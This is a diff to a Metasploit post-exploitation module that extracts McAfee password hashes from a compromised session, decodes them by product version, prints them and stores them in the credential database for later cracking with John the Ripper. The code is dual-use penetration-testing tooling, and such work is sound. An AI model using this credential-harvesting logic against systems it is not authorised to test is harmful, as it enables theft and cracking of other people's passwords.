@@ -91,56 +91,36 @@ class Metasploit3 < Msf::Post
 
   def process_hashes_and_versions(hashes_and_versions)
     hashes_and_versions.each do |hash, version|
-      if version >= VERSION_8 && version < VERSION_9
+      if version >= VERSION_5 && version < VERSION_6
+        hashtype = 'md5u'
+        version_name = 'v5'
+      else
         # Base64 decode hash
         hash =  Rex::Text.to_hex(Rex::Text.decode_base64(hash), "")
-        print_good("McAfee v8 password hash: #{hash}")
         hashtype = 'dynamic_1405'
-      elsif version >= VERSION_5 && version < VERSION_6
-        print_good("McAfee v5 password hash: #{hash}")
-        hashtype = 'md5u'
-      else
-        print_warning("Could not identify the version of McAfee - Assuming v8")
-        print_good("McAfee v8 password hash: #{hash}")
-        hashtype = 'dynamic_1405'
+        version_name = 'v8'
+        if !(version >= VERSION_8 && version < VERSION_9)
+          print_warning("Unknown McAfee version #{version_name} - Assuming v8")
+        end
       end
 
-      # report
-      service_data = {
-        address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
-        port: rport,
-        service_name: 'McAfee',
-        protocol: 'tcp',
-        workspace_id: myworkspace_id
-      }
+      print_good("McAfee #{version_name} (#{hashtype}) password hash: #{hash}")
 
-      # Initialize Metasploit::Credential::Core object
       credential_data = {
         post_reference_name: refname,
         origin_type: :session,
-        private_type: :password,
+        private_type: :nonreplayable_hash,
         private_data: hash,
         session_id: session_db_id,
         jtr_format: hashtype,
         workspace_id: myworkspace_id,
-        username: "null"
       }
 
-      # Merge the service data into the credential data
-      credential_data.merge!(service_data)
+      create_credential(credential_data)
 
-      # Create the Metasploit::Credential::Core object
-      credential_core = create_credential(credential_data)
-
-      # Assemble the options hash for creating the Metasploit::Credential::Login object
-      login_data = {
-        core: credential_core,
-        status: Metasploit::Model::Login::Status::UNTRIED
-      }
-
-      # Merge in the service data and create our Login
-      create_credential_login(login_data.merge!(service_data))
+      # TODO: store_loot the file in the appropriate format, which likely means
+      # iterating over hashes_and_versions differently so that they are grouped
+      # by version (because john can only crack one format at a time)
     end
   end
-
 end
